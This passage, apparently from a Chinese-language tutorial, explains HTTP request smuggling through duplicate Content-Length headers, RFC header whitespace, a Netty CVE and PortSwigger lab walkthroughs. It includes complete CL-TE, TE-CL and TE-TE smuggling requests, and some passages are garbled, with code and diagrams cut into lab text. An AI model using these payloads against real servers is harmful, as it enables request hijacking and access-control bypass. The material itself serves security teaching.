    Host: example.com\r\n
    \r\n
在这里，我们假设 Front 服务器以第二个 Content-Length 为解析标准，抛弃第一个 Content-Length
字段或者对第一个不做任何处理或者 anything else ，反正假设它只处理第二个 Content-Length 字段；我们在假设
Backend服务器以第一个 Content-Length 字段为解析标准，不理会第二个。
这样就相当于我们在 HTTP 请求中注入了另一个 HTTP 请求，如果整个场景像我们上述这样，就存在 HTTP Smuggling 攻击。
如过服务器以第一个 Content-Length 为解析标准，这样解析就会出现两个 HTTP 请求，如果以第二个作为解析标准，则会认为只有一个 HTTP
请求。
### Optional WhiteSpace
RFC7320 中对于 header 字段有这样的描述：
> 3.2. Header Fields
>
> Each header field consists of a case-insensitive field name followed  
>  by a colon (":"), optional leading whitespace, the field value, and  
>  optional trailing whitespace.
>
> header-field = field-name ":" OWS field-value OWS
>  
>  
>     field-name     = token
>      field-value    = *( field-content / obs-fold )
>      field-content  = field-vchar [ 1*( SP / HTAB ) field-vchar ]
>      field-vchar    = VCHAR / obs-text
>
>  
>  obs-fold = CRLF 1*( SP / HTAB )  
>  ; obsolete line folding  
>  ; see Section 3.2.4
>
> The field-name token labels the corresponding field-value as having  
>  the semantics defined by that header field. For example, the Date  
>  header field is defined in Section 7.1.1.2 of [RFC7231] as containing  
>  the origination timestamp for the message in which it appears.
尤其是开头的一句话表明，字段后面应该紧跟`:`冒号，然后是 OWS(Optional WhiteSpace) 可选的空格，然后再是字段值，最后是 OWS
可选空格。
这个会存在什么问题呢？很明显，如果有中间件对于这个的实现并没有严格遵循 RFC 标准的话，也会产生 HTTP Smuggling 攻击。
比较典型的例子就是 CVE-2019-16869 ，这枚 CVE 是 OPPO 子午互联网安全实验室发掘的，是关于 Netty 中间件存在 HTTP
Smuggling 漏洞。
在 Netty 4.1.42.Final 版本之前对于 Header 头的处理是使用
[splitHeader](https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/java/io/netty/handler/codec/http/HttpObjectDecoder.java)
方法，其中关键代码如下：
    for (nameEnd = nameStart; nameEnd  This lab involves a front-end and back-end server, and the front-end server
> doesn't support chunked encoding. The front-end server rejects requests that
> aren't using the GET or POST method.
>
> To solve the lab, smuggle a request to the back-end server, so that the next
> request processed by the back-end server appears to use the method GPOST.
根据题目提示，我们只需要让 Backend 服务器收到 GPOST 方法即可，而且场景也明确告诉我们是一种 CL-TE 的场景。
    POST / HTTP/1.1
    Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 6
    Transfer-Encoding: chunked
    0
    G
根据题目的提示要求，这里我们发送两次以上 HTTP 请求包：
我们就可以使第二次请求构造出 GPOST 的 HTTP Method 了，详细的我们可以按照下面这个流程图来看看：
    User            Front           Backend
                          |               |               |
                          |--A(1A+1/2B)-->|               | 
                          |               |--A(1A+1/2B)-->| 
                          |               ||            [1/2B]
                          |               |--C----------->| * ending B *
                          |               | This lab involves a front-end and back-end server, and the back-end server
> doesn't support chunked encoding. The front-end server rejects requests that
> aren't using the GET or POST method.
>
> To solve the lab, smuggle a request to the back-end server, so that the next
> request processed by the back-end server appears to use the method GPOST.
按照题目提示，我们要达到的仍然是让后端收到 GPOST 请求，而且场景也明确告诉我们是一种 TE-CL 的场景。
    POST / HTTP/1.1
    Host: acde1ffc1f047f9f8007186200ff00fe.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-length: 4
    Transfer-Encoding: chunked
    12
    GPOST / HTTP/1.1
    0
这里需要注意的是最后需要加两个 CRLF 构造 chunk data，也就是
    0\r\n
    \r\n
根据题目的提示要求，这里我们发送两次以上 HTTP 请求包即可，我们可以收到如下图所示的响应。
过程流程与 CL-TE 类似，Front 服务器处理这个请求的时候按照 TE 优先处理，会认为上面的请求为一个请求整体，然后转发给 Backend
服务器，Backend 服务器在处理的时候按照 CL 优先处理，会认为`12\r\n`为第一个请求的 body ，以下为第二个请求，所以会响应 GPOST
为无法识别的 HTTP Method。
### Two Identical Fields - TE
这里我们来看 TE 都存在的情况，同样我们借助 LAB 实验来加深理解：[Lab: HTTP request smuggling, obfuscating
the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
> This lab involves a front-end and back-end server, and the two servers
> handle duplicate HTTP request headers in different ways. The front-end
> server rejects requests that aren't using the GET or POST method.
>
> To solve the lab, smuggle a request to the back-end server, so that the next
> request processed by the back-end server appears to use the method GPOST.
按照题目提示，我们要达到的仍然是让后端收到 GPOST 请求，而且场景也明确告诉我们是一种 TE-TE
的场景。其实这个场景也可以认为是相同字段的场景处理，比如说在处理两个 TE 字段，如果取第二个 TE
字段作为解析标准，而第二个字段值非正常或者解析出错，就可能会忽略掉 TE 字段，而使用 CL 字段进行解析。比如在这个 LAB 中，我们发送两遍如下请求：
    POST / HTTP/1.1
    Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ
    Cache-Control: max-age=0
    Content-length: 4
    Transfer-Encoding: chunked
    Transfer-encoding: nothing
    12
    GPOST / HTTP/1.1
    0
这里同上一个场景一样，需要在最后添加两个 CRLF ：
    0\r\n
    \r\n
我们就可以得到如下图的响应：
我们可以看到这里是用了两个 TE 字段，并且第二个 TE 字段值非标准值，这里 Front 选择对第一个 TE 进行优先处理，整个请求则为正常请求，会转发给
Backend 服务器，而 Backend 服务器以第二个 TE 进行优先处理，而第二个 TE 值非正常，则会取 CL 字段进行处理，这样这个请求就会因为
CL 字段设置的值 4 而被拆分为两个请求。
第一个请求：
    POST / HTTP/1.1
    Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ
    Cache-Control: max-age=0
    Content-length: 4
    Transfer-Encoding: chunked
    Transfer-encoding: nothing
    12
第二个请求：
    GPOST / HTTP/1.1
    0
这样就发送了一个无法识别的 HTTP Method GPOST 请求。
## Attack Surface